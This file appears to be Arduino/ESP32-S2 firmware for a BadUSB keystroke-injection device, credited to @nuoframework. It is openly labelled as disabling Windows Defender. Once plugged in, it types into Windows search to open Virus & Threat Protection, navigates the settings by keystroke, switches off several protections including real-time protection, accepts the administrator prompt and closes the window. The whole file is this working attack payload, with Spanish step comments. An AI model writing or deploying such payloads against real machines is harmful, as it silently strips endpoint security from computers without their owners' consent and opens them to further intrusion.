#include "hidkeyboard.h"

HIDkeyboard Keyboard;

// Coded by @nuoframework --> https://nuoframework.github.io/
// For ESP32-S2-SOLO by ESPRESSIF
// Disable Windows Defender (In administrator account)


void setup() {
  
  Serial.begin(38400);
  Keyboard.begin();
  delay(700);
  Keyboard.sendPress(HID_KEY_GUI_LEFT); //Abre busqueda windows
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendString("Protecci"); //Escribe
  delay(500);
  Keyboard.sendPress(HID_KEY_ENTER); //Confirma
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_ENTER); //Entra en el apartado de proteccion y amenazas
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  
  for (int i = 0; i < 4; i++) {       //Llega hasta la parte de administracion
    Keyboard.sendPress(HID_KEY_TAB);
    delay(200);
    Keyboard.sendRelease();
    delay(100);
  }
  
  Keyboard.sendPress(HID_KEY_ENTER); //Selecciona el primer elemento
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_SPACE); //Desactivas
  delay(200);
  Keyboard.sendRelease();
  delay(1000);
  Keyboard.sendPress(HID_KEY_ARROW_LEFT); //Marcas opcion si (permisos adm)
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_ENTER); //Confirmas
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_TAB); //Seleccionas la 2º opcion
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_SPACE); //Desactivas
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_TAB); //Seleccionas la 3º opcion
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_SPACE); //Desactivas
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_TAB); //Seleccionas opcion intermedia
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_TAB); //Seleccionas la 4º opcion
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_SPACE); //Desactivas
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  Keyboard.sendPress(HID_KEY_F4, KEYBOARD_MODIFIER_LEFTALT); //Cierra Windows
  delay(200);
  Keyboard.sendRelease();
  delay(100);
  
}

void loop() {
  // put your main code here, to run repeatedly:

}
